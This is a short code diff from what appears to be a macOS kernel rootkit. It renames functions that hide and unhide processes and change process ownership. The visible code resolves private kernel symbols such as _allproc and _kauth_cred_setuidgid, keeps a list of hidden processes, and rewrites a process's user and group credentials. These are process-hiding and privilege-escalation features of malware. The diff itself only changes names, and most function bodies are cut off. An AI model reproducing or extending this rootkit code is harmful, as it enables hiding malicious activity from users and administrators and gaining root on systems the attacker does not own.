@@ -28,7 +28,7 @@ struct hiddenProc {
 LIST_HEAD(hiddenProcsHead, hiddenProc) hidden_procs_head;
 
 struct proc *
-getProcess(pid_t pid) {
+get_process(pid_t pid) {
     
     struct proclist *allproc = find_symbol("_allproc");
     struct proc *process = NULL;
@@ -42,7 +42,7 @@ getProcess(pid_t pid) {
 }
 
 kern_return_t
-hideProcess(pid_t pid) {
+hide_process(pid_t pid) {
     
     /* Find the required symbols */
     struct proclist *allproc = find_symbol("_allproc");
@@ -93,7 +93,7 @@ hideProcess(pid_t pid) {
 }
 
 kern_return_t
-showProcess(pid_t pid) {
+show_process(pid_t pid) {
     
     struct hiddenProc *item;
     
@@ -117,13 +117,13 @@ showProcess(pid_t pid) {
 }
 
 kern_return_t
-changeProcessOwnership(uid_t realUid, uid_t uid, gid_t gid) {
+change_process_ownership(uid_t realUid, uid_t uid, gid_t gid) {
     
     void (*proc_list_lock)(void) = find_symbol("_proc_list_lock");
     void (*proc_list_unlock)(void) = find_symbol("_proc_list_unlock");
     kauth_cred_t (*kauth_cred_setuidgid)(kauth_cred_t, uid_t, gid_t) = find_symbol("_kauth_cred_setuidgid");
     
-    struct proc *process = getProcess(realUid);
+    struct proc *process = get_process(realUid);
     
     if(process == NULL)
         return KERN_FAILURE;
